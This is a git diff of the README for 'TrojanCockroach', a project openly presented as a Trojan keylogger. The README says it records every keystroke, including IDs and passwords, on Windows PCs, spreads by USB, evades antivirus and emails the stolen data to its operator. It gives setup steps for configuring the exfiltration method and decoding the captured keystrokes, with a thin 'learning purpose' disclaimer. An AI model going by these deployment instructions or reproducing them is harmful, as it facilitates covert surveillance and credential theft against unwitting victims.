@@ -6,6 +6,8 @@
 
 <a href="https://MinhasKamal.github.io/TrojanCockroach">This program</a> is a **Trojan Virus** that steals data (ID, password; every key stroke) from PC (Windows XP or later) and emails it back to the author. It spreads among PCs through USB drives. It is undetectable by any antivirus software.
 
+This project is created only for learning purpose.
+
 ### Setup
 1. Preparation
   1. Change **getRandomName()** and **sendData()** method of **TrojanCockroach.cpp** according to your wish.
@@ -29,12 +31,12 @@
   2. After getting the email copy the full message to a text file. As the the message has come through email certain characters are converted. To resolve that --- --- ---.
   3. Now, run **DecodeMessage.exe** for decoding the message as plain text. In this phase, you can look for specific patterns in the text, and thus get rid of most of the useless parts (like- mouse click, or same key-group press as happens during gaming).
 
-You can get a more clear understanding of the project from its pre-project- **[SmartKeyLogger](https://github.com/MinhasKamal/SmartKeyLogger)**.
+You can get a more clear understanding of the project from its pre-project- **[StupidKeyLogger](https://github.com/MinhasKamal/StupidKeyLogger)**.
 
-**Note:** I do not want newbies to abuse my project, so I am **not revealing all the secrets**. The 'README' is not easy to understand either. I have also made some nonsense changes in the code, so that no one can run it effectively without getting his hands dirty.
+**Note:** I do not want newbies to abuse my project, so I am **not revealing all the secrets**. There are also some intentionally created holes in this 'README'. I have also made some nonsense changes in the code, so that no one can run it effectively without getting his hands dirty.
 
 I will not also take any responsibility of someone else's ill act with my program. But I do believe that a real learner will learn a lot from this.
 
 
 ### License
-<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/MinhasKamal/EgamiLight">Trojan Cockroach</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
+<a rel="license" href="https://opensource.org/licenses/MIT"><img alt="MIT License" src="https://cloud.githubusercontent.com/assets/5456665/18950087/fbe0681a-865f-11e6-9552-e59d038d5913.png" width="60em" height=auto/></a><br/><a href="https://github.com/MinhasKamal/TrojanCockroach">Trojan Cockroach</a> is licensed under <a rel="license" href="https://opensource.org/licenses/MIT">MIT License</a>.
